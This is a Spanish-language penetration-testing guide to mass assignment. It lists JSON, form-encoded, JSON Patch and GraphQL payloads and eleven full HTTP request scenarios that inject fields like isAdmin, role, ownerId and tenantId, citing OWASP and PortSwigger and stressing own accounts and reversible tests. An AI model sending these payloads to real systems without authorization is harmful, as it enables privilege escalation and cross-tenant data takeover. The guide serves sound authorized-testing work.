# 🗡️ Mass assignment: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Propiedades sensibles en perfil

```json
{"displayName":"Prueba","isAdmin":true}
{"displayName":"Prueba","role":"admin"}
{"displayName":"Prueba","verified":true}
{"displayName":"Prueba","accountStatus":"active"}
```

**Cuándo usarlo:** Solicitudes alternativas sobre un perfil propio. La aceptación JSON o eco de respuesta no prueba efecto: releer el estado y verificar un cambio de privilegio real.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).


### IDs y propiedad asignable

```json
{"displayName":"Prueba","ownerId":"{ID_A}"}
{"displayName":"Prueba","ownerId":"{ID_B}"}
{"displayName":"Prueba","userId":"{ID_B}"}
{"displayName":"Prueba","tenantId":"{TENANT_B_PROPIO}"}
```

**Cuándo usarlo:** Usar A y B propios para probar creación o edición. Se requiere que el backend persista el propietario no autorizado; un campo ignorado no es hallazgo.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).


## 🧭 Payloads por contexto

### Campos anidados y notación de formulario

```text
profile[role]=admin
user[isAdmin]=true
account[plan]=premium
permissions[0]=admin
role=admin
```

**Cuándo usarlo:** Una variante por solicitud y solo si el parser admite form encoding o estructuras anidadas. Comparar persistencia y permisos posteriores.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).


### Superficies de creación y edición

```text
POST /api/register
POST /api/users
PATCH /api/me
PUT /api/users/{ID_A}
POST /graphql
```

**Cuándo usarlo:** Identificar la ruta real y añadir un campo por vez a un objeto propio. El mismo modelo puede exponer reglas de binding distintas entre registro, perfil y API.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).


## 🔥 Payloads avanzados

### JSON Patch y campo de sistema

```json
[{"op":"add","path":"/role","value":"admin"}]
[{"op":"replace","path":"/isAdmin","value":true}]
[{"op":"add","path":"/permissions/-","value":"admin"}]
[{"op":"replace","path":"/ownerId","value":"{ID_B}"}]
```

**Cuándo usarlo:** Solo para endpoints que aceptan RFC 6902. Son documentos alternativos; modificar privilegios únicamente en un entorno de prueba reversible y comprobar autorización final.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).


### Mutaciones GraphQL con input excesivo

```graphql
mutation { updateProfile(input:{displayName:"Prueba"}) { id } }
mutation { updateProfile(input:{displayName:"Prueba",role:"admin"}) { id } }
mutation { createUser(input:{email:"{EMAIL_PROPIO}",isAdmin:true}) { id } }
mutation { updateUser(input:{id:"{ID_A}",tenantId:"{TENANT_B_PROPIO}"}) { id } }
```

**Cuándo usarlo:** Solo enviar campos que el esquema acepte y cuentas propias. El hallazgo exige que un campo reservado se persista y produzca efecto, no solo que aparezca en introspección.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


## 🔬 Pruebas guiadas por escenario

### 1. isAdmin en registro

**Objetivo:** Añadir un atributo de privilegio a la creación de una cuenta propia de laboratorio.

```http
POST /api/register HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{"email":"{EMAIL_PROPIO_NUEVO}","password":"{PASSWORD_DE_LAB}","isAdmin":true}
```

**Interpretación:** Leer la cuenta creada y probar una función de rol alto. Eco del JSON sin persistencia ni privilegio no confirma fallo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 2. role en actualización de perfil

**Objetivo:** Añadir role a un PATCH legítimo de la cuenta propia de rol bajo.

```http
PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","role":"admin"}
```

**Interpretación:** Comprobar valor persistido y autorización efectiva. Restaurar displayName y no asumir que role es el campo real.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 3. Estado de verificación

**Objetivo:** Si la representación propia expone emailVerified o verified, comprobar que el cliente no pueda escribirlo.

```http
PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","emailVerified":true}
```

**Interpretación:** Verificar persistencia y una decisión que dependa de verificación; el simple reflejo del campo no demuestra bypass.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 4. ownerId en creación de objeto

**Objetivo:** Crear un objeto propio de A indicando como dueño la cuenta propia B.

```http
POST /api/projects HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","ownerId":"{ID_CUENTA_B}"}
```

**Interpretación:** Si se crea, consultar propiedad con A y B. La API debe derivar el dueño del principal o validar permiso de reasignación.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 5. tenantId no editable

**Objetivo:** En un tenant de prueba, agregar otro tenantId propio a una edición permitida.

```http
PATCH /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","tenantId":"{TENANT_PROPIO_B}"}
```

**Interpretación:** Confirmar si cambió la pertenencia real desde ambas cuentas; un identificador reflejado no prueba traspaso.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 6. Objeto anidado sensible

**Objetivo:** Si el esquema admite un objeto user anidado, intentar incluir un atributo de rol no editable.

```json
{"profile":{"displayName":"prueba-controlada"},"user":{"roles":["admin"]}}
```

**Interpretación:** Usar una estructura observada en el modelo real. Algunos binders enlazan propiedades anidadas aun si la UI no las envía.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 7. Binding de formulario

**Objetivo:** Comparar un campo extra en form-urlencoded cuando la API acepta formularios además de JSON.

```http
POST /account/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/x-www-form-urlencoded

displayName=prueba-controlada&isAdmin=true
```

**Interpretación:** El formato alterno puede pasar por otro binder. Confirmar persistencia y función de privilegio bajo la cuenta propia.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 8. PUT de objeto completo

**Objetivo:** En un recurso propio con PUT real, añadir una propiedad de solo lectura a la representación completa.

```http
PUT /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"id":"{PROYECTO_A}","name":"proyecto-de-prueba","createdBy":"{ID_CUENTA_B}"}
```

**Interpretación:** Probar solo si PUT conserva campos omitidos o en un objeto descartable propio; corroborar createdBy con GET posterior.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 9. Input de mutación GraphQL

**Objetivo:** Agregar un atributo de control al input de una mutación de perfil propia.

```graphql
mutation Editar($input: UpdateProfileInput!) { updateProfile(input: $input) { id role } }
variables: {"input":{"displayName":"prueba-controlada","role":"admin"}}
```

**Interpretación:** La sintaxis de variables se adapta al esquema observado. Si el tipo no declara role, rechazo de validación no informa sobre el binder.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 10. JSON Patch sobre atributo sensible

**Objetivo:** Solo si el endpoint acepta RFC 6902, intentar reemplazar role en la cuenta propia.

```http
PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json-patch+json

[{"op":"replace","path":"/role","value":"admin"}]
```

**Interpretación:** El servidor debe autorizar la ruta de propiedad; comprobar persistencia y privilegio efectivo, no solo eco de patch.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 11. Notación anidada de formulario

**Objetivo:** Si el framework enlaza campos form-urlencoded a objetos, agregar user[role] en perfil propio.

```http
POST /account/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/x-www-form-urlencoded

user[displayName]=prueba-controlada&user[role]=admin
```

**Interpretación:** Aplicar solo a una estructura de formulario observada; confirmar que role se persiste y cambia autorización.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
